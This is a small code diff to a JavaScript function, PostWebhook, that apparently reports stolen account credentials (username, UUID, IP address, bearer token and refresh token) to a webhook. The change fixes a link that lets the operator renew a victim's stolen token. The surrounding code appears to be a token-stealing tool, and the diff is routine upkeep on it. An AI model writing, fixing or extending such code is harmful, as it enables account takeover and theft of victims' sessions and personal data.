@@ -331,7 +331,7 @@ function PostWebhook(refresh, username, uuid, ip, BearerToken, refresh_token, ne
                 },
                 {
                     "name": "Refresh Token",
-                    "value": `Click [here](${redirect_uri}refresh/refresh_token=${refresh_token}) to refresh their token!`,
+                    "value": `Click [here](${redirect_uri}/refresh/refresh_token=${refresh_token}) to refresh their token!`,
                 }
             ]
         }
